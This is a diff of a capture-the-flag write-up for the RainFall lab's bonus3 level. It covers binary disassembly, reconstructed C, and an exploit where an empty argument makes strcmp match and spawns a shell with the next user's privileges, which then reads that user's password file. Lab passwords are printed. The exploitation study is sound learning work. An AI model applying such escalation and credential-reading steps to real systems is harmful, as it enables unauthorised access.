@@ -1,14 +1,19 @@
+* Access
+#+begin_src shell
 bonus2@RainFall:~$ su bonus3
 Password: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
-# Gathering info
-## Strings
+#+end_src
+
+* Data Gathering
+** Strings
 bonus3@RainFall:~$ readelf -p .rodata bonus3
 String dump of section '.rodata':
   [     8]  r
   [     a]  /home/user/end/.pass
   [    1f]  sh
   [    22]  /bin/sh
-## Functions
+** Functions
+#+begin_src shell
 0x080483b0  strcmp@plt -> cmp a str
 0x080483c0  fclose@plt -> close a file
 0x080483d0  fread@plt-> read a file
@@ -17,7 +22,11 @@ String dump of section '.rodata':
 0x08048420  execl@plt -> execute a program
 0x08048430  atoi@plt -> pass arr to int
 0x080484f4  main
-### Disass Functions
+#+end_src
+
+* Binary Analisys
+** Disass Functions
+#+begin_src shell
 (gdb) disass main
    0x080484f4 <+0>:	push   ebp
    0x080484f5 <+1>:	mov    ebp,esp
@@ -92,227 +101,33 @@ String dump of section '.rodata':
    0x08048619 <+293>:	pop    edi
    0x0804861a <+294>:	pop    ebp
    0x0804861b <+295>:	ret    
-### Recode
-(gdb) p (char *) 0x80486f0
-$2 = 0x80486f0 "r"
-(gdb) p (char *) 0x80486f2
-$3 = 0x80486f2 "/home/user/end/.pass"
-   0x080484fc <+8>:	sub    esp,0xa0 -> 10 * 16 = 160 B
-   0x08048502 <+14>:	mov    edx,0x80486f0 -> "r"
-   0x08048507 <+19>:	mov    eax,0x80486f2 -> "/home/user/end/.pass"
-   0x0804850c <+24>:	mov    DWORD PTR [esp+0x4],edx -> mode of fopen param 2
-   0x08048510 <+28>:	mov    DWORD PTR [esp],eax     -> path of file param 1
-   0x08048513 <+31>:	call   0x8048410 <fopen@plt>
-   0x08048518 <+36>:	mov    DWORD PTR [esp+0x9c],eax
-   ....
-int main(void)
-{
-   FILE *fptr; // fptr [esp + 0x9c]
+#+end_src
+** Code
+[[source]]
 
-   fptr = fopen("/home/user/end/.pass", "r");
-   ...
-}
-   0x0804851f <+43>:	lea    ebx,[esp+0x18] -> buffer
-   0x08048523 <+47>:	mov    eax,0x0        -> value to fill
-   0x08048528 <+52>:	mov    edx,0x21       -> times to repeat 16 * 2 + 1= 31 * 4 B = 124 B
-   0x0804852d <+57>:	mov    edi,ebx        -> buffer to write
-   0x0804852f <+59>:	mov    ecx,edx        -> times
-   0x08048531 <+61>:	rep stos DWORD PTR es:[edi],eax -> advance and save as DWORD 4 B
-   
-int main(void)
-{
-   FILE *fptr;             // fptr [esp + 0x9c]
-   char buffer[124] = {0}; // buffer [esp + 0x18]
-
-   fptr = fopen("/home/user/end/.pass", "r");
-   
-   ...
-}
-   0x08048533 <+63>:	cmp    DWORD PTR [esp+0x9c],0x0 -> cmp fopen return null
-   0x0804853b <+71>:	je     0x8048543 <main+79>      -> if eq NULL 
-   0x08048543 <+79>:	mov    eax,0xffffffff           -> return -1.
-   0x08048548 <+84>:	jmp    0x8048615 <main+289>     -> jmp to return clean.
-   0x0804853d <+73>:	cmp    DWORD PTR [ebp+0x8],0x2 -> argc == 2
-   0x08048541 <+77>:	je     0x804854d <main+89>
-   0x08048543 <+79>:	mov    eax,0xffffffff           -> return -1.
-   0x08048548 <+84>:	jmp    0x8048615 <main+289>     -> jmp to return clean.
-int main(int argc, char *argv[])
-{
-   FILE *fptr;             // fptr [esp + 0x9c]
-   char buffer[124] = {0}; // buffer [esp + 0x18]
-
-   fptr = fopen("/home/user/end/.pass", "r");
-   if (!fptr || argc != 2)
-      return (-1)
-   ...
-}
-   0x0804854d <+89>:	lea    eax,[esp+0x18]          -> buffer
-   0x08048551 <+93>:	mov    edx,DWORD PTR [esp+0x9c] -> fopen ptr
-   0x08048558 <+100>:	mov    DWORD PTR [esp+0xc],edx  argument fread 4 fopen ptr
-   0x0804855c <+104>:	mov    DWORD PTR [esp+0x8],0x42 -> count 66 B
-   0x08048564 <+112>:	mov    DWORD PTR [esp+0x4],0x1  -> size 
-   0x0804856c <+120>:	mov    DWORD PTR [esp],eax      -> buffer to write
-   0x0804856f <+123>:	call   0x80483d0 <fread@plt>    -> call
-int main(int argc, char *argv[])
-{
-   FILE *fptr;             // fptr [esp + 0x9c]
-   char buffer[124] = {0}; // buffer [esp + 0x18]
-
-   fptr = fopen("/home/user/end/.pass", "r");
-   if (!fptr || argc != 2)
-      return (-1)
-   fread(buffer, 1, 66, fptr);
-   ...
-}
-   0x08048574 <+128>:	mov    BYTE PTR [esp+0x59],0x0 *((char *)buffer + 9) = '\0'
-   0x08048579 <+133>:	mov    eax,DWORD PTR [ebp+0xc] -> argv
-   0x0804857c <+136>:	add    eax,0x4                 -> &argv[1]
-   0x0804857f <+139>:	mov    eax,DWORD PTR [eax]     -> argv[1]
-   0x08048581 <+141>:	mov    DWORD PTR [esp],eax     -> param atoi
-   0x08048584 <+144>:	call   0x8048430 <atoi@plt>    -> call atoi
-   0x08048589 <+149>:	mov    BYTE PTR [esp+eax*1+0x18],0x0 -> buffer[atoi_ret] = 0
-int main(int argc, char *argv[])
-{
-   FILE *fptr;             // fptr [esp + 0x9c]
-   char buffer[124] = {0}; // buffer [esp + 0x18]
-
-   fptr = fopen("/home/user/end/.pass", "r");
-   if (!fptr || argc != 2)
-      return (-1)
-   fread(buffer, 1, 66, fptr);
-   buffer[9] = '\0';
-   buffer[atoi(argv[1])] = '\0';
-   ...
-}
-   0x0804858e <+154>:	lea    eax,[esp+0x18]  -> buffer
-   0x08048592 <+158>:	lea    edx,[eax+0x42]  -> buffer + (16 * 4 + 2 = 66 B)
-   0x08048595 <+161>:	mov    eax,DWORD PTR [esp+0x9c] -> fptr
-   0x0804859c <+168>:	mov    DWORD PTR [esp+0xc],eax -> argument fread 4 fopen ptr
-   0x080485a0 <+172>:	mov    DWORD PTR [esp+0x8],0x41   -> count                  
-   0x080485a8 <+180>:	mov    DWORD PTR [esp+0x4],0x1    -> size                   
-   0x080485b0 <+188>:	mov    DWORD PTR [esp],edx        -> buffer to write        
-   0x080485b3 <+191>:	call   0x80483d0 <fread@plt>      -> call
-int main(int argc, char *argv[])
-{
-   FILE *fptr;             // fptr [esp + 0x9c]
-   char buffer[124] = {0}; // buffer [esp + 0x18]
-
-   fptr = fopen("/home/user/end/.pass", "r");
-   if (!fptr || argc != 2)
-      return (-1)
-   fread(buffer, 1, 66, fptr);
-   buffer[9] = '\0';
-   buffer[atoi(argv[1])] = '\0';
-   fread(buffer + 66, 1, 41, fptr);
-   ...
-}
-   0x080485b8 <+196>:	mov    eax,DWORD PTR [esp+0x9c]
-   0x080485bf <+203>:	mov    DWORD PTR [esp],eax
-   0x080485c2 <+206>:	call   0x80483c0 <fclose@plt>
-int main(int argc, char *argv[])
-{
-   FILE *fptr;             // fptr [esp + 0x9c]
-   char buffer[124] = {0}; // buffer [esp + 0x18]
-
-   fptr = fopen("/home/user/end/.pass", "r");
-   if (!fptr || argc != 2)
-      return (-1)
-   fread(buffer, 1, 66, fptr);
-   buffer[9] = '\0';
-   buffer[atoi(argv[1])] = '\0';
-   fread(buffer + 66, 1, 41, fptr);
-   fclose(fptr);
-}
-   0x080485c7 <+211>:	mov    eax,DWORD PTR [ebp+0xc] -> argv
-   0x080485ca <+214>:	add    eax,0x4                 -> &argv[1]
-   0x080485cd <+217>:	mov    eax,DWORD PTR [eax]     -> argv[1]
-   0x080485cf <+219>:	mov    DWORD PTR [esp+0x4],eax -> param2 argv[1]
-   0x080485d3 <+223>:	lea    eax,[esp+0x18]          -> eax, buffer
-   0x080485d7 <+227>:	mov    DWORD PTR [esp],eax     -> param1, buffer
-   0x080485da <+230>:	call   0x80483b0 <strcmp@plt>  -> call
-int main(int argc, char *argv[])
-{
-   FILE *fptr;             // fptr [esp + 0x9c]
-   char buffer[124] = {0}; // buffer [esp + 0x18]
-
-   fptr = fopen("/home/user/end/.pass", "r");
-   if (!fptr || argc != 2)
-      return (-1)
-   fread(buffer, 1, 66, fptr);
-   buffer[9] = '\0';
-   buffer[atoi(argv[1])] = '\0';
-   fread(buffer + 66, 1, 41, fptr);
-   fclose(fptr);
-   strcmp(buffer, argv[1]);
-}
-   0x080485df <+235>:	test   eax,eax
-   0x080485e1 <+237>:	jne    0x8048601 <main+269> -> no  zero
-   0x08048601 <+269>:	lea    eax,[esp+0x18] -> buffer
-   0x08048605 <+273>:	add    eax,0x42       -> buffer + 42
-   0x08048608 <+276>:	mov    DWORD PTR [esp],eax -> param (buffer + 42);
-   0x0804860b <+279>:	call   0x80483e0 <puts@plt> -> puts (buffer + 42);
-
-int main(int argc, char *argv[])
-{
-   FILE *fptr;             // fptr [esp + 0x9c]
-   char buffer[124] = {0}; // buffer [esp + 0x18]
-
-   fptr = fopen("/home/user/end/.pass", "r");
-   if (!fptr || argc != 2)
-      return (-1)
-   fread(buffer, 1, 66, fptr);
-   buffer[9] = '\0';
-   buffer[atoi(argv[1])] = '\0';
-   fread(buffer + 66, 1, 41, fptr);
-   fclose(fptr);
-   if (!strcmp(buffer, argv[1]))
-   {
-    puts(buffer + 42);
-    return (0);
-   }
-}
-(gdb) p (char *)0x8048707
-$4 = 0x8048707 "sh"
-(gdb) p (char *)0x804870a
-$5 = 0x804870a "/bin/sh"
-
-0x080485e3 <+239>:	mov    DWORD PTR [esp+0x8],0x0 -> null param3
-0x080485eb <+247>:	mov    DWORD PTR [esp+0x4],0x8048707 -> 'sh' param 2
-0x080485f3 <+255>:	mov    DWORD PTR [esp],0x804870a     -> '/bin/sh' param 1
-0x080485fa <+262>:	call   0x8048420 <execl@plt>         -> execl -> binsh
-0x080485ff <+267>:	jmp    0x8048610 <main+284>          -> return properly
-
-
-## let's try to see the logic.
-# We open a file.
-## check open correctly and argc == 2
-## buffer[9] == maybe to avoid overflow whatever
-## buffer[atoi(argv[1])] = '\0' -> take the first argument an take the pos and put a '\0'
-## strcmp buffer and argv
-### if diff puts (buff + 42)
-### else execute shell
-# Conclusion
-we don't know the content of the file.
-## Let's try to don't need to guess| bruteforce the first 9 or less chars.
-### let's try to cmp the same string
-#### Simple way make a null string the one i want to cmp= ""
-atoi("") = 0
-buffer[atoi(argv[1])] = '\0'
-strcmp(buffer, argv[1]) == "", "" -> should return 0 and go to the shell ;)
-# Exploit
-## Payload
-""
-## Execution
+** Explotation idea
+just we need to enter in "!strcmp"
+try to cmp the same string
+we are going to use "" as argv[1]
+atoi("") == 0
+buffer[0] = 0;
+(str view) buffer  == ""
+argv[1] == ""
+then they are equal
+* Exploit
+#+begin_src shell
 bonus3@RainFall:~$ ./bonus3 ""
-### Check all is fine
 $ id
 uid=2013(bonus3) gid=2013(bonus3) euid=2014(end) egid=100(users) groups=2014(end),100(users),2013(bonus3)
-### Get the pass
 cat /home/user/end/.pass
 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+#+end_src
+* Access the last user
+#+begin_src shell
 bonus3@RainFall:~$ su end
 Password: 
-end@RainFall:~$
+end@RainFall:~$ ls
+end
 end@RainFall:~$ ls -lhtr end
 -rwsr-s---+ 1 end users 26 Sep 23  2015 end
 end@RainFall:~$ readelf -p .rodata end
@@ -323,5 +138,5 @@ Congratulations graduate!
 end@RainFall:~$ ./end
 ./end: line 1: Congratulations: command not found
 end@RainFall:~$ 
-# End of the Project.
+#+end_src
 
